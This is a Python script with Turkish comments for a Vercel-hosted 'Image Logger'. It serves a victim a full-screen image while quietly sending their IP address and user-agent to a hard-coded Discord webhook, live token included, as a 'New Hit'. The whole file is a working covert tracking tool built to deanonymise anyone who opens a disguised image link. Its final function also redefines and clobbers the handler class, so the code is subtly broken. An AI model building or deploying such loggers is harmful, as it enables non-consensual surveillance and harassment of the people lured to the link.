from http.server import BaseHTTPRequestHandler
import requests

# ===================== CONFIG =====================
WEBHOOK = "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC"
IMAGE_URL = "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # IP al (Vercel'de en güvenli yöntem)
            ip = self.headers.get("x-forwarded-for") or "Unknown"
            useragent = self.headers.get("user-agent", "Unknown")

            # Basit IP logu gönder (daha az hata şansı)
            try:
                embed = {
                    "username": "Image Logger",
                    "embeds": [{
                        "title": "✅ Image Logger - New Hit",
                        "color": 0x00FFFF,
                        "description": f"**Birisi resmi açtı!**\n**IP:** `{ip}`\n**User-Agent:** `{useragent[:200]}`",
                        "timestamp": "now"
                    }]
                }
                requests.post(WEBHOOK, json=embed, timeout=6)
            except:
                pass  # webhook hata verse bile devam et

            # Fotoğrafı göster (en basit yöntem)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f'''
            <html>
            <head><title>Loading...</title></head>
            <body style="margin:0;background:black;">
                <img src="{IMAGE_URL}" style="width:100vw;height:100vh;object-fit:contain;">
            </body>
            </html>
            '''.encode()
            self.wfile.write(html)

        except:
            # Herhangi bir şey çökerse bile boş bir resim sayfası göster
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b'<html><body style="background:black;color:white;text-align:center;padding-top:100px;"><h1>Error but trying to show image...</h1></body></html>')

# Vercel için zorunlu
def handler(event, context=None):
    return handler
